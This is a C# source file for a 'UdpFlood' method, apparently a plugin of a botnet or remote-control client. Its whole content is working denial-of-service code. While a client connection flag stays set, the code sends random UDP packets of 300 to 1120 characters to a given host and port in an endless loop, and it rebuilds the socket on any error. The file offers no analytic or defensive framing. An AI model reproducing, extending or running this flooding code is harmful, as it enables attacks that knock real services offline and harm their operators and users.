using System.Net;
using System.Net.Sockets;
using Plugin.Helper;

namespace Plugin.Methods;

internal class UdpFlood : Method
{
	public string Name { get; } = "UdpFlood";


	public void Run(string host, int port)
	{
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
		socket.Blocking = false;
		IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(host), port);
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				byte[] bytes = Common.Encodings[Randomizer.random.Next(Common.Encodings.Length)].GetBytes(Randomizer.getRandomCharacters(Randomizer.random.Next(300, 1120)));
				socket.SendTo(bytes, remoteEP);
			}
			catch
			{
				socket.Dispose();
				socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
				socket.Blocking = false;
			}
		}
		socket.Dispose();
	}
}
